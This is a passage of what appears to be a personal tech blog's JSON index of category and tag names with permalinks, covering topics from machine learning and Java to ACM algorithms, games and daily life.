/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8/CNN/"},{"name":"Python","slug":"Python","permalink":"http://enderxiao.github.io/categories/Python/"},{"name":"计算机语言","slug":"计算机语言","permalink":"http://enderxiao.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%AF%AD%E8%A8%80/"},{"name":"研究生课程基础","slug":"研究生课程基础","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F%E8%AF%BE%E7%A8%8B%E5%9F%BA%E7%A1%80/"},{"name":"LeetCode","slug":"LeetCode","permalink":"http://enderxiao.github.io/categories/LeetCode/"},{"name":"CV","slug":"CV","permalink":"http://enderxiao.github.io/categories/CV/"},{"name":"图像处理","slug":"CV/图像处理","permalink":"http://enderxiao.github.io/categories/CV/%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/"},{"name":"疫情返乡","slug":"Life/关于我们/疫情返乡","permalink":"http://enderxiao.github.io/categories/Life/%E5%85%B3%E4%BA%8E%E6%88%91%E4%BB%AC/%E7%96%AB%E6%83%85%E8%BF%94%E4%B9%A1/"},{"name":"导读","slug":"Life/导读","permalink":"http://enderxiao.github.io/categories/Life/%E5%AF%BC%E8%AF%BB/"},{"name":"计算机图形学","slug":"计算机图形学","permalink":"http://enderxiao.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6/"},{"name":"图形学入门","slug":"计算机图形学/图形学入门","permalink":"http://enderxiao.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6/%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%A5%E9%97%A8/"},{"name":"Games101","slug":"Games101","permalink":"http://enderxiao.github.io/categories/Games101/"},{"name":"1-8","slug":"Games101/1-8","permalink":"http://enderxiao.github.io/categories/Games101/1-8/"},{"name":"TensorFlow","slug":"Python/TensorFlow","permalink":"http://enderxiao.github.io/categories/Python/TensorFlow/"},{"name":"React","slug":"前端/React","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/React/"},{"name":"计算机视觉","slug":"计算机视觉","permalink":"http://enderxiao.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%A7%86%E8%A7%89/"},{"name":"高级计算机网络","slug":"研究生/高级计算机网络","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E9%AB%98%E7%BA%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"},{"name":"人工智能原理","slug":"研究生/人工智能原理","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%8E%9F%E7%90%86/"},{"name":"Machine Learning","slug":"Machine-Learning","permalink":"http://enderxiao.github.io/categories/Machine-Learning/"},{"name":"机器学习入门","slug":"Machine-Learning/机器学习入门","permalink":"http://enderxiao.github.io/categories/Machine-Learning/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8/"},{"name":"数学工具","slug":"数学工具","permalink":"http://enderxiao.github.io/categories/%E6%95%B0%E5%AD%A6%E5%B7%A5%E5%85%B7/"},{"name":"英语","slug":"研究生/英语","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E8%8B%B1%E8%AF%AD/"},{"name":"Genshin","slug":"Life/Genshin","permalink":"http://enderxiao.github.io/categories/Life/Genshin/"},{"name":"爬虫","slug":"Python/爬虫","permalink":"http://enderxiao.github.io/categories/Python/%E7%88%AC%E8%99%AB/"},{"name":"概率论","slug":"概率论","permalink":"http://enderxiao.github.io/categories/%E6%A6%82%E7%8E%87%E8%AE%BA/"},{"name":"云服务器","slug":"云服务器","permalink":"http://enderxiao.github.io/categories/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"name":"xpath","slug":"xpath","permalink":"http://enderxiao.github.io/categories/xpath/"},{"name":"键盘","slug":"键盘","permalink":"http://enderxiao.github.io/categories/%E9%94%AE%E7%9B%98/"},{"name":"客制化","slug":"键盘/客制化","permalink":"http://enderxiao.github.io/categories/%E9%94%AE%E7%9B%98/%E5%AE%A2%E5%88%B6%E5%8C%96/"},{"name":"pytorch_lightning","slug":"pytorch-lightning","permalink":"http://enderxiao.github.io/categories/pytorch-lightning/"},{"name":"离散数学","slug":"离散数学","permalink":"http://enderxiao.github.io/categories/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/"},{"name":"研究生入学考试","slug":"研究生入学考试","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F%E5%85%A5%E5%AD%A6%E8%80%83%E8%AF%95/"},{"name":"复试","slug":"研究生入学考试/复试","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F%E5%85%A5%E5%AD%A6%E8%80%83%E8%AF%95/%E5%A4%8D%E8%AF%95/"},{"name":"本科","slug":"本科","permalink":"http://enderxiao.github.io/categories/%E6%9C%AC%E7%A7%91/"},{"name":"毕业设计","slug":"本科/毕业设计","permalink":"http://enderxiao.github.io/categories/%E6%9C%AC%E7%A7%91/%E6%AF%95%E4%B8%9A%E8%AE%BE%E8%AE%A1/"},{"name":"ssm","slug":"ssm","permalink":"http://enderxiao.github.io/categories/ssm/"},{"name":"mybatis","slug":"ssm/mybatis","permalink":"http://enderxiao.github.io/categories/ssm/mybatis/"},{"name":"Java","slug":"Java","permalink":"http://enderxiao.github.io/categories/Java/"},{"name":"Maven","slug":"Java/Maven","permalink":"http://enderxiao.github.io/categories/Java/Maven/"},{"name":"反射","slug":"Java/反射","permalink":"http://enderxiao.github.io/categories/Java/%E5%8F%8D%E5%B0%84/"},{"name":"注解","slug":"Java/注解","permalink":"http://enderxiao.github.io/categories/Java/%E6%B3%A8%E8%A7%A3/"},{"name":"基础","slug":"Java/基础","permalink":"http://enderxiao.github.io/categories/Java/%E5%9F%BA%E7%A1%80/"},{"name":"ACM","slug":"ACM","permalink":"http://enderxiao.github.io/categories/ACM/"},{"name":"算法","slug":"ACM/算法","permalink":"http://enderxiao.github.io/categories/ACM/%E7%AE%97%E6%B3%95/"},{"name":"数论番外","slug":"ACM/数论番外","permalink":"http://enderxiao.github.io/categories/ACM/%E6%95%B0%E8%AE%BA%E7%95%AA%E5%A4%96/"},{"name":"数论进阶","slug":"ACM/数论进阶","permalink":"http://enderxiao.github.io/categories/ACM/%E6%95%B0%E8%AE%BA%E8%BF%9B%E9%98%B6/"},{"name":"数论入门","slug":"ACM/数论入门","permalink":"http://enderxiao.github.io/categories/ACM/%E6%95%B0%E8%AE%BA%E5%85%A5%E9%97%A8/"},{"name":"数论初步","slug":"ACM/数论初步","permalink":"http://enderxiao.github.io/categories/ACM/%E6%95%B0%E8%AE%BA%E5%88%9D%E6%AD%A5/"},{"name":"赛后补题","slug":"ACM/赛后补题","permalink":"http://enderxiao.github.io/categories/ACM/%E8%B5%9B%E5%90%8E%E8%A1%A5%E9%A2%98/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"},{"name":"前端","slug":"前端","permalink":"http://enderxiao.github.io/tags/%E5%89%8D%E7%AB%AF/"},{"name":"Mock","slug":"Mock","permalink":"http://enderxiao.github.io/tags/Mock/"},{"name":"React","slug":"React","permalink":"http://enderxiao.github.io/tags/React/"},{"name":"前端框架","slug":"前端框架","permalink":"http://enderxiao.github.io/tags/%E5%89%8D%E7%AB%AF%E6%A1%86%E6%9E%B6/"},{"name":"设计模式","slug":"设计模式","permalink":"http://enderxiao.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"JS","slug":"JS","permalink":"http://enderxiao.github.io/tags/JS/"},{"name":"docker","slug":"docker","permalink":"http://enderxiao.github.io/tags/docker/"},{"name":"容器","slug":"容器","permalink":"http://enderxiao.github.io/tags/%E5%AE%B9%E5%99%A8/"},{"name":"网安","slug":"网安","permalink":"http://enderxiao.github.io/tags/%E7%BD%91%E5%AE%89/"},{"name":"后端框架","slug":"后端框架","permalink":"http://enderxiao.github.io/tags/%E5%90%8E%E7%AB%AF%E6%A1%86%E6%9E%B6/"},{"name":"Node","slug":"Node","permalink":"http://enderxiao.github.io/tags/Node/"},{"name":"数据库","slug":"数据库","permalink":"http://enderxiao.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"mySQL","slug":"mySQL","permalink":"http://enderxiao.github.io/tags/mySQL/"},{"name":"H5","slug":"H5","permalink":"http://enderxiao.github.io/tags/H5/"},{"name":"ES6","slug":"ES6","permalink":"http://enderxiao.github.io/tags/ES6/"},{"name":"NodeJS","slug":"NodeJS","permalink":"http://enderxiao.github.io/tags/NodeJS/"},{"name":"WebAPI","slug":"WebAPI","permalink":"http://enderxiao.github.io/tags/WebAPI/"},{"name":"JS基础","slug":"JS基础","permalink":"http://enderxiao.github.io/tags/JS%E5%9F%BA%E7%A1%80/"},{"name":"CSS","slug":"CSS","permalink":"http://enderxiao.github.io/tags/CSS/"},{"name":"CV","slug":"CV","permalink":"http://enderxiao.github.io/tags/CV/"},{"name":"图像处理","slug":"图像处理","permalink":"http://enderxiao.github.io/tags/%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/"},{"name":"论文笔记","slug":"论文笔记","permalink":"http://enderxiao.github.io/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"},{"name":"Transformer","slug":"Transformer","permalink":"http://enderxiao.github.io/tags/Transformer/"},{"name":"端到端","slug":"端到端","permalink":"http://enderxiao.github.io/tags/%E7%AB%AF%E5%88%B0%E7%AB%AF/"},{"name":"手写体识别","slug":"手写体识别","permalink":"http://enderxiao.github.io/tags/%E6%89%8B%E5%86%99%E4%BD%93%E8%AF%86%E5%88%AB/"},{"name":"深度神经网络","slug":"深度神经网络","permalink":"http://enderxiao.github.io/tags/%E6%B7%B1%E5%BA%A6%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"},{"name":"深度学习","slug":"深度学习","permalink":"http://enderxiao.github.io/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"},{"name":"注意力机制","slug":"注意力机制","permalink":"http://enderxiao.github.io/tags/%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/"},{"name":"树形编码器","slug":"树形编码器","permalink":"http://enderxiao.github.io/tags/%E6%A0%91%E5%BD%A2%E7%BC%96%E7%A0%81%E5%99%A8/"},{"name":"Life","slug":"Life","permalink":"http://enderxiao.github.io/tags/Life/"},{"name":"投影仪","slug":"投影仪","permalink":"http://enderxiao.github.io/tags/%E6%8A%95%E5%BD%B1%E4%BB%AA/"},{"name":"游戏开发工具","slug":"游戏开发工具","permalink":"http://enderxiao.github.io/tags/%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"},{"name":"Unity","slug":"Unity","permalink":"http://enderxiao.github.io/tags/Unity/"},{"name":"香水","slug":"香水","permalink":"http://enderxiao.github.io/tags/%E9%A6%99%E6%B0%B4/"},{"name":"Vue","slug":"Vue","permalink":"http://enderxiao.github.io/tags/Vue/"},{"name":"NLP","slug":"NLP","permalink":"http://enderxiao.github.io/tags/NLP/"},{"name":"GAN","slug":"GAN","permalink":"http://enderxiao.github.io/tags/GAN/"},{"name":"ViT预训练","slug":"ViT预训练","permalink":"http://enderxiao.github.io/tags/ViT%E9%A2%84%E8%AE%AD%E7%BB%83/"},{"name":"ViT","slug":"ViT","permalink":"http://enderxiao.github.io/tags/ViT/"},{"name":"movie","slug":"movie","permalink":"http://enderxiao.github.io/tags/movie/"},{"name":"CoMER","slug":"CoMER","permalink":"http://enderxiao.github.io/tags/CoMER/"},{"name":"BaseLine","slug":"BaseLine","permalink":"http://enderxiao.github.io/tags/BaseLine/"},{"name":"环境搭建","slug":"环境搭建","permalink":"http://enderxiao.github.io/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"name":"PyTorch","slug":"PyTorch","permalink":"http://enderxiao.github.io/tags/PyTorch/"},{"name":"Python","slug":"Python","permalink":"http://enderxiao.github.io/tags/Python/"},{"name":"RNN","slug":"RNN","permalink":"http://enderxiao.github.io/tags/RNN/"},{"name":"编码解码架构","slug":"编码解码架构","permalink":"http://enderxiao.github.io/tags/%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81%E6%9E%B6%E6%9E%84/"},{"name":"CNN","slug":"CNN","permalink":"http://enderxiao.github.io/tags/CNN/"},{"name":"CUDA","slug":"CUDA","permalink":"http://enderxiao.github.io/tags/CUDA/"},{"name":"机器学习","slug":"机器学习","permalink":"http://enderxiao.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"python","slug":"python","permalink":"http://enderxiao.github.io/tags/python/"},{"name":"基础","slug":"基础","permalink":"http://enderxiao.github.io/tags/%E5%9F%BA%E7%A1%80/"},{"name":"OCR","slug":"OCR","permalink":"http://enderxiao.github.io/tags/OCR/"},{"name":"LeetCode","slug":"LeetCode","permalink":"http://enderxiao.github.io/tags/LeetCode/"},{"name":"算法","slug":"算法","permalink":"http://enderxiao.github.io/tags/%E7%AE%97%E6%B3%95/"},{"name":"N皇后","slug":"N皇后","permalink":"http://enderxiao.github.io/tags/N%E7%9A%87%E5%90%8E/"},{"name":"算法优化","slug":"算法优化","permalink":"http://enderxiao.github.io/tags/%E7%AE%97%E6%B3%95%E4%BC%98%E5%8C%96/"},{"name":"位运算","slug":"位运算","permalink":"http://enderxiao.github.io/tags/%E4%BD%8D%E8%BF%90%E7%AE%97/"},{"name":"二进制","slug":"二进制","permalink":"http://enderxiao.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"},{"name":"DFS","slug":"DFS","permalink":"http://enderxiao.github.io/tags/DFS/"},{"name":"笔记检测","slug":"笔记检测","permalink":"http://enderxiao.github.io/tags/%E7%AC%94%E8%AE%B0%E6%A3%80%E6%B5%8B/"},{"name":"生日","slug":"生日","permalink":"http://enderxiao.github.io/tags/%E7%94%9F%E6%97%A5/"},{"name":"手链","slug":"手链","permalink":"http://enderxiao.github.io/tags/%E6%89%8B%E9%93%BE/"},{"name":"二分查找","slug":"二分查找","permalink":"http://enderxiao.github.io/tags/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/"},{"name":"全排列","slug":"全排列","permalink":"http://enderxiao.github.io/tags/%E5%85%A8%E6%8E%92%E5%88%97/"},{"name":"返乡","slug":"返乡","permalink":"http://enderxiao.github.io/tags/%E8%BF%94%E4%B9%A1/"},{"name":"北京","slug":"北京","permalink":"http://enderxiao.github.io/tags/%E5%8C%97%E4%BA%AC/"},{"name":"疫情","slug":"疫情","permalink":"http://enderxiao.github.io/tags/%E7%96%AB%E6%83%85/"},{"name":"硕士研究生","slug":"硕士研究生","permalink":"http://enderxiao.github.io/tags/%E7%A1%95%E5%A3%AB%E7%A0%94%E7%A9%B6%E7%94%9F/"},{"name":"导师那些事","slug":"导师那些事","permalink":"http://enderxiao.github.io/tags/%E5%AF%BC%E5%B8%88%E9%82%A3%E4%BA%9B%E4%BA%8B/"},{"name":"Games","slug":"Games","permalink":"http://enderxiao.github.io/tags/Games/"},{"name":"Devolver Digital","slug":"Devolver-Digital","permalink":"http://enderxiao.github.io/tags/Devolver-Digital/"},{"name":"《3秒》","slug":"《3秒》","permalink":"http://enderxiao.github.io/tags/%E3%80%8A3%E7%A7%92%E3%80%8B/"},{"name":"导读","slug":"导读","permalink":"http://enderxiao.github.io/tags/%E5%AF%BC%E8%AF%BB/"},{"name":"马克·安托万·马修","slug":"马克·安托万·马修","permalink":"http://enderxiao.github.io/tags/%E9%A9%AC%E5%85%8B%C2%B7%E5%AE%89%E6%89%98%E4%B8%87%C2%B7%E9%A9%AC%E4%BF%AE/"},{"name":"计算机图形学","slug":"计算机图形学","permalink":"http://enderxiao.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6/"},{"name":"Games101","slug":"Games101","permalink":"http://enderxiao.github.io/tags/Games101/"},{"name":"口红","slug":"口红","permalink":"http://enderxiao.github.io/tags/%E5%8F%A3%E7%BA%A2/"},{"name":"唇釉","slug":"唇釉","permalink":"http://enderxiao.github.io/tags/%E5%94%87%E9%87%89/"},{"name":"发展史","slug":"发展史","permalink":"http://enderxiao.github.io/tags/%E5%8F%91%E5%B1%95%E5%8F%B2/"},{"name":"TensorFlow","slug":"TensorFlow","permalink":"http://enderxiao.github.io/tags/TensorFlow/"},{"name":"广播机制","slug":"广播机制","permalink":"http://enderxiao.github.io/tags/%E5%B9%BF%E6%92%AD%E6%9C%BA%E5%88%B6/"},{"name":"打工","slug":"打工","permalink":"http://enderxiao.github.io/tags/%E6%89%93%E5%B7%A5/"},{"name":"滤波","slug":"滤波","permalink":"http://enderxiao.github.io/tags/%E6%BB%A4%E6%B3%A2/"},{"name":"平滑","slug":"平滑","permalink":"http://enderxiao.github.io/tags/%E5%B9%B3%E6%BB%91/"},{"name":"双边滤波","slug":"双边滤波","permalink":"http://enderxiao.github.io/tags/%E5%8F%8C%E8%BE%B9%E6%BB%A4%E6%B3%A2/"},{"name":"高级计算机网络","slug":"高级计算机网络","permalink":"http://enderxiao.github.io/tags/%E9%AB%98%E7%BA%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"},{"name":"北航计网实验","slug":"北航计网实验","permalink":"http://enderxiao.github.io/tags/%E5%8C%97%E8%88%AA%E8%AE%A1%E7%BD%91%E5%AE%9E%E9%AA%8C/"},{"name":"综合组网实验","slug":"综合组网实验","permalink":"http://enderxiao.github.io/tags/%E7%BB%BC%E5%90%88%E7%BB%84%E7%BD%91%E5%AE%9E%E9%AA%8C/"},{"name":"802.11","slug":"802-11","permalink":"http://enderxiao.github.io/tags/802-11/"},{"name":"WiFi","slug":"WiFi","permalink":"http://enderxiao.github.io/tags/WiFi/"},{"name":"8圆盘问题","slug":"8圆盘问题","permalink":"http://enderxiao.github.io/tags/8%E5%9C%86%E7%9B%98%E9%97%AE%E9%A2%98/"},{"name":"A算法","slug":"A算法","permalink":"http://enderxiao.github.io/tags/A%E7%AE%97%E6%B3%95/"},{"name":"BFS","slug":"BFS","permalink":"http://enderxiao.github.io/tags/BFS/"},{"name":"Machine Learning","slug":"Machine-Learning","permalink":"http://enderxiao.github.io/tags/Machine-Learning/"},{"name":"数学","slug":"数学","permalink":"http://enderxiao.github.io/tags/%E6%95%B0%E5%AD%A6/"},{"name":"梯度下降","slug":"梯度下降","permalink":"http://enderxiao.github.io/tags/%E6%A2%AF%E5%BA%A6%E4%B8%8B%E9%99%8D/"},{"name":"函数极值","slug":"函数极值","permalink":"http://enderxiao.github.io/tags/%E5%87%BD%E6%95%B0%E6%9E%81%E5%80%BC/"},{"name":"英语","slug":"英语","permalink":"http://enderxiao.github.io/tags/%E8%8B%B1%E8%AF%AD/"},{"name":"英语论文写作","slug":"英语论文写作","permalink":"http://enderxiao.github.io/tags/%E8%8B%B1%E8%AF%AD%E8%AE%BA%E6%96%87%E5%86%99%E4%BD%9C/"},{"name":"abstract","slug":"abstract","permalink":"http://enderxiao.github.io/tags/abstract/"},{"name":"Genshin","slug":"Genshin","permalink":"http://enderxiao.github.io/tags/Genshin/"},{"name":"原神","slug":"原神","permalink":"http://enderxiao.github.io/tags/%E5%8E%9F%E7%A5%9E/"},{"name":"伤害乘区论","slug":"伤害乘区论","permalink":"http://enderxiao.github.io/tags/%E4%BC%A4%E5%AE%B3%E4%B9%98%E5%8C%BA%E8%AE%BA/"},{"name":"雷神","slug":"雷神","permalink":"http://enderxiao.github.io/tags/%E9%9B%B7%E7%A5%9E/"},{"name":"爬虫","slug":"爬虫","permalink":"http://enderxiao.github.io/tags/%E7%88%AC%E8%99%AB/"},{"name":"字符集","slug":"字符集","permalink":"http://enderxiao.github.io/tags/%E5%AD%97%E7%AC%A6%E9%9B%86/"},{"name":"chardet","slug":"chardet","permalink":"http://enderxiao.github.io/tags/chardet/"},{"name":"概率论","slug":"概率论","permalink":"http://enderxiao.github.io/tags/%E6%A6%82%E7%8E%87%E8%AE%BA/"},{"name":"贝叶斯公式","slug":"贝叶斯公式","permalink":"http://enderxiao.github.io/tags/%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%85%AC%E5%BC%8F/"},{"name":"先验概率","slug":"先验概率","permalink":"http://enderxiao.github.io/tags/%E5%85%88%E9%AA%8C%E6%A6%82%E7%8E%87/"},{"name":"bs4","slug":"bs4","permalink":"http://enderxiao.github.io/tags/bs4/"},{"name":"云服务器","slug":"云服务器","permalink":"http://enderxiao.github.io/tags/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"name":"ss服务","slug":"ss服务","permalink":"http://enderxiao.github.io/tags/ss%E6%9C%8D%E5%8A%A1/"},{"name":"科学上网","slug":"科学上网","permalink":"http://enderxiao.github.io/tags/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"},{"name":"ShadowSocksR","slug":"ShadowSocksR","permalink":"http://enderxiao.github.io/tags/ShadowSocksR/"},{"name":"共青团","slug":"共青团","permalink":"http://enderxiao.github.io/tags/%E5%85%B1%E9%9D%92%E5%9B%A2/"},{"name":"xpath","slug":"xpath","permalink":"http://enderxiao.github.io/tags/xpath/"},{"name":"进阶","slug":"进阶","permalink":"http://enderxiao.github.io/tags/%E8%BF%9B%E9%98%B6/"},{"name":"多进程","slug":"多进程","permalink":"http://enderxiao.github.io/tags/%E5%A4%9A%E8%BF%9B%E7%A8%8B/"},{"name":"多线程","slug":"多线程","permalink":"http://enderxiao.github.io/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"name":"IO编程","slug":"IO编程","permalink":"http://enderxiao.github.io/tags/IO%E7%BC%96%E7%A8%8B/"},{"name":"客制化","slug":"客制化","permalink":"http://enderxiao.github.io/tags/%E5%AE%A2%E5%88%B6%E5%8C%96/"},{"name":"机械键盘","slug":"机械键盘","permalink":"http://enderxiao.github.io/tags/%E6%9C%BA%E6%A2%B0%E9%94%AE%E7%9B%98/"},{"name":"键帽","slug":"键帽","permalink":"http://enderxiao.github.io/tags/%E9%94%AE%E5%B8%BD/"},{"name":"MDA破晓","slug":"MDA破晓","permalink":"http://enderxiao.github.io/tags/MDA%E7%A0%B4%E6%99%93/"},{"name":"异常处理","slug":"异常处理","permalink":"http://enderxiao.github.io/tags/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/"},{"name":"调试","slug":"调试","permalink":"http://enderxiao.github.io/tags/%E8%B0%83%E8%AF%95/"},{"name":"测试","slug":"测试","permalink":"http://enderxiao.github.io/tags/%E6%B5%8B%E8%AF%95/"},{"name":"BBOX60","slug":"BBOX60","permalink":"http://enderxiao.github.io/tags/BBOX60/"},{"name":"函数式编程","slug":"函数式编程","permalink":"http://enderxiao.github.io/tags/%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B/"},{"name":"pytorch","slug":"pytorch","permalink":"http://enderxiao.github.io/tags/pytorch/"},{"name":"pytorch_lightning","slug":"pytorch-lightning","permalink":"http://enderxiao.github.io/tags/pytorch-lightning/"},{"name":"面向对象","slug":"面向对象","permalink":"http://enderxiao.github.io/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"},{"name":"OOP","slug":"OOP","permalink":"http://enderxiao.github.io/tags/OOP/"},{"name":"离散数学","slug":"离散数学","permalink":"http://enderxiao.github.io/tags/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/"},{"name":"复合关系关系","slug":"复合关系关系","permalink":"http://enderxiao.github.io/tags/%E5%A4%8D%E5%90%88%E5%85%B3%E7%B3%BB%E5%85%B3%E7%B3%BB/"},{"name":"逆关系","slug":"逆关系","permalink":"http://enderxiao.github.io/tags/%E9%80%86%E5%85%B3%E7%B3%BB/"},{"name":"等价关系","slug":"等价关系","permalink":"http://enderxiao.github.io/tags/%E7%AD%89%E4%BB%B7%E5%85%B3%E7%B3%BB/"},{"name":"偏序关系","slug":"偏序关系","permalink":"http://enderxiao.github.io/tags/%E5%81%8F%E5%BA%8F%E5%85%B3%E7%B3%BB/"},{"name":"二元关系","slug":"二元关系","permalink":"http://enderxiao.github.io/tags/%E4%BA%8C%E5%85%83%E5%85%B3%E7%B3%BB/"},{"name":"笛卡尔积","slug":"笛卡尔积","permalink":"http://enderxiao.github.io/tags/%E7%AC%9B%E5%8D%A1%E5%B0%94%E7%A7%AF/"},{"name":"毕业设计","slug":"毕业设计","permalink":"http://enderxiao.github.io/tags/%E6%AF%95%E4%B8%9A%E8%AE%BE%E8%AE%A1/"},{"name":"微信小程序","slug":"微信小程序","permalink":"http://enderxiao.github.io/tags/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/"},{"name":"本科","slug":"本科","permalink":"http://enderxiao.github.io/tags/%E6%9C%AC%E7%A7%91/"},{"name":"虚拟校园","slug":"虚拟校园","permalink":"http://enderxiao.github.io/tags/%E8%99%9A%E6%8B%9F%E6%A0%A1%E5%9B%AD/"},{"name":"Java","slug":"Java","permalink":"http://enderxiao.github.io/tags/Java/"},{"name":"Spring","slug":"Spring","permalink":"http://enderxiao.github.io/tags/Spring/"},{"name":"mybatis","slug":"mybatis","permalink":"http://enderxiao.github.io/tags/mybatis/"},{"name":"Maven","slug":"Maven","permalink":"http://enderxiao.github.io/tags/Maven/"},{"name":"Java反射","slug":"Java反射","permalink":"http://enderxiao.github.io/tags/Java%E5%8F%8D%E5%B0%84/"},{"name":"Java注解","slug":"Java注解","permalink":"http://enderxiao.github.io/tags/Java%E6%B3%A8%E8%A7%A3/"},{"name":"Java基础语法","slug":"Java基础语法","permalink":"http://enderxiao.github.io/tags/Java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"name":"集合","slug":"集合","permalink":"http://enderxiao.github.io/tags/%E9%9B%86%E5%90%88/"},{"name":"二进制枚举","slug":"二进制枚举","permalink":"http://enderxiao.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%9E%9A%E4%B8%BE/"},{"name":"blog","slug":"blog","permalink":"http://enderxiao.github.io/tags/blog/"},{"name":"数论","slug":"数论","permalink":"http://enderxiao.github.io/tags/%E6%95%B0%E8%AE%BA/"},{"name":"算法竞赛","slug":"算法竞赛","permalink":"http://enderxiao.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"概率","slug":"概率","permalink":"http://enderxiao.github.io/tags/%E6%A6%82%E7%8E%87/"},{"name":"组合数学","slug":"组合数学","permalink":"http://enderxiao.github.io/tags/%E7%BB%84%E5%90%88%E6%95%B0%E5%AD%A6/"}]}